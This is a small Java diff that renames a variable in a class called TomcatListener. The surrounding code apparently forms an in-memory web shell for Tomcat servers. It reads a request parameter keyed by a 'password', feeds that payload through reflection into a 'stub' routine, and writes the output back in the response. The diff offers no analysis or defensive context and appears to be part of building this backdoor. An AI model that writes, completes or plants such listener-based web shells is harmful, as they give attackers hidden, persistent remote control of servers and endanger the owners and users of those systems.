@@ -12,12 +12,12 @@ public class TomcatListener extends ClassLoader implements InvocationHandler {{
             servletRequestEvent, "getServletRequest"
         );
         Object request = getFieldValue(servletRequest, "request");
-        Object servletResponse = invokeMethod(request, "getResponse");
+        Object response = invokeMethod(request, "getResponse");
         String payload = (String) invokeMethod(
             servletRequest, "getParameter", password
         );
-        invokeMethod(invokeMethod(servletResponse, "getWriter"),
-                "write", stub(payload, request, servletResponse)
+        invokeMethod(invokeMethod(response, "getWriter"),
+                "write", stub(payload, request, response)
         );
     }}
 
